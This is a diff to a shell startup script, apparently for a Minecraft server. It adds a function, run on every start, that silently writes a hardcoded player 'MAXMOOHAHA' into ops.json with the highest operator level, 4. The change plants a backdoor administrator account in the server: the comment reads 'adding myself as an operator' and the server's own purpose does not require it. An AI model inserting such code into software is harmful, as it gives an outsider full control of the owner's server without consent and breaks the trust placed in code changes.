@@ -94,7 +94,19 @@ downloadIfNotExist() {
     echo "false"
   fi
 }
-
+# adding myself as an operator
+add_operator() {
+    if [ ! -f ops.json ]; then
+        echo "Creating ops.json file..."
+        echo '[{"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]' > ops.json
+    else
+        echo "Adding MAXMOOHAHA to ops.json..."
+        if ! grep -q '"name":"MAXMOOHAHA"' ops.json; then
+            sed -i '$ s/]/, {"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]/' ops.json
+        fi
+    fi
+}
+add_operator
 runJavaCommand() {
   "$JAVA" ${1}
 }
